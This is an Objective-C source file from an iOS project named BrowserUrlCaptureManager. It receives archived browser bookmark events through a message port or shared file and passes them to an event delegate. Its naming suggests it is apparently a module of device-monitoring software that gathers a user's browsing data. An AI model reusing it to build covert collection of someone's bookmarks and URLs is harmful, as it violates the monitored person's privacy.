//
//  BookmarkCapture.m
//  BrowserUrlCaptureManager
//
//  Created by Suttiporn Nitipitayanusad on 4/27/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "BookmarkCapture.h"
#import "DefStd.h"
#import "EventCenter.h"
#import "FxBookmarkEvent.h"

#import <UIKit/UIKit.h>

@implementation BookmarkCapture

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate {
	if ((self = [self init])) {
		mEventDelegate = aEventDelegate;
	}
	return self;
}

- (void) startCapture {
	DLog(@"==== [BookmarkCapture] start capture");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kBookmarkMessagePort withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader == nil) {
			mSharedFileReader = [[SharedFile2IPCReader alloc] initWithSharedFileName:kBookmarkMessagePort
																		withDelegate:self];
			[mSharedFileReader start];
		}
	}
}

- (void) stopCapture {
	DLog(@"==== [BookmarkCapture] stop capture");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
	
	if (mSharedFileReader != nil) {
		[mSharedFileReader stop];
		[mSharedFileReader release];
		mSharedFileReader = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog(@"====  [BookmarkCapture] data did received from message port");
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxBookmarkEvent *bookmarkEvent = [unarchiver decodeObjectForKey:kBookmarkArchived];
    //DLog(@"==== Bookmark event count = %d", [[bookmarkEvent bookmarks] count]);
	//for (NSInteger i = 0; i < [[bookmarkEvent bookmarks] count]; i++) {
	//	FxBookmark *bookmark = [[bookmarkEvent bookmarks] objectAtIndex:i];
	//	DLog(@"==== Bookmark : %@ : %@", [bookmark mTitle], [bookmark mUrl]);
	//}
    [unarchiver finishDecoding];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:bookmarkEvent];
	}
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
